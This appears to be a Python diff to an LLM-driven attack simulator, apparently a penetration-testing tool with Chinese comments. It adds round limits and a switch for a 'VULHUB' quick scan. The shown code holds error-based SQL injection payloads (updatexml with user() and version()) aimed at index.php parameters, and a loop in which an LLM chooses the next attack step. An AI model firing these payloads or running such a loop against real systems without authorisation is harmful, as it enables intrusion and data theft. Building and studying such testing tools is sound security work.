@@ -50,11 +50,19 @@ class AttackStep:
 class AttackSimulator:
     """
     LLM 驱动的模拟攻击引擎。
-    实现“探测-学习-反应”闭环。
+    实现"探测-学习-反应"闭环。
     """
-    def __init__(self, target: str, strategy: str = "intelligent"):
+    def __init__(
+        self,
+        target: str,
+        strategy: str = "intelligent",
+        max_rounds: int = 10,
+        enable_vulhub_scan: bool = True,
+    ):
         self.target = target.rstrip("/")
         self.strategy = strategy
+        self.max_rounds = max_rounds
+        self.enable_vulhub_scan = enable_vulhub_scan
         self.llm = LLMProvider()
         self.recon_engine = ReconEngine()
         self.rule_engine = RuleEngine()
@@ -64,11 +72,13 @@ class AttackSimulator:
         self.context: Dict[str, Any] = {
             "target": self.target,
             "technologies": [],
-            "detected_frameworks": [],  # 侦察阶段检测到的框架
-            "tech_versions": {},        # 技术版本信息
-            "entry_points": [],         # 侦察阶段发现的入口点
+            "detected_frameworks": [],
+            "tech_versions": {},
+            "entry_points": [],
             "current_phase": "init",
-            "history": []
+            "history": [],
+            "target_vuln_types": [],
+            "target_parameters": [],
         }
 
     def set_recon_context(self, context: Dict[str, Any]):
@@ -76,12 +86,13 @@ class AttackSimulator:
         self.detected_frameworks = context.get('detected_frameworks', [])
         self.framework_versions = context.get('framework_versions', {})
 
-        # 更新上下文供 LLM 使用
         self.context['detected_frameworks'] = context.get('detected_frameworks', [])
         self.context['tech_versions'] = context.get('framework_versions', {})
         self.context['entry_points'] = context.get('entry_points', [])
         self.context['already_found_vulns'] = context.get('already_found_vulns', [])
         self.context['technologies'] = context.get('technologies', [])
+        self.context['target_vuln_types'] = context.get('target_vuln_types', [])
+        self.context['target_parameters'] = context.get('target_parameters', [])
         
     async def run_simulation(self) -> Dict[str, Any]:
         """执行完整的模拟攻击流程"""
@@ -120,9 +131,10 @@ class AttackSimulator:
             logger.info(f"📦 检测到的框架: {self.context['detected_frameworks']}")
             logger.info(f"🔑 发现的入口点: {self.context['entry_points']}")
 
-            # 2. VULHUB 快速扫描: 直接注入预定义 payload
-            logger.info("🔧 开始 VULHUB 快速扫描...")
+            # 2. VULHUB 快速扫描
             found_vulns = []
+            if self.enable_vulhub_scan:
+                logger.info("🔧 开始 VULHUB 快速扫描...")
             vulhub_payloads = [
                 {"path": "index.php", "params": {"s": "/index/index/index", "ids[0,updatexml(0,concat(0xa,user()),0)]": "1"}},
                 {"path": "index.php", "params": {"s": "/index/index/index", "ids[0,updatexml(0,concat(0xa,version()),0)]": "1"}},
@@ -179,6 +191,8 @@ class AttackSimulator:
                             logger.info(f"❌ 规则引擎未确认: {reason}")
                 except Exception as e:
                     logger.warning(f"VULHUB payload 测试失败: {e}")
+            else:
+                logger.info("⏭️ 跳过 VULHUB 扫描（定向模式）")
             
             # 如果已发现漏洞,直接返回结果,不再进行 LLM 循环
             if found_vulns:
@@ -191,8 +205,7 @@ class AttackSimulator:
                 }
 
             # 3. 模拟攻击循环 (LLM 决策,仅当 VULHUB 未找到漏洞时)
-            max_rounds = 10
-            for i in range(max_rounds):
+            for i in range(self.max_rounds):
                 
                 # 调用 LLM 决策下一步
                 decision = await self.llm.decide_next_step(self.context)
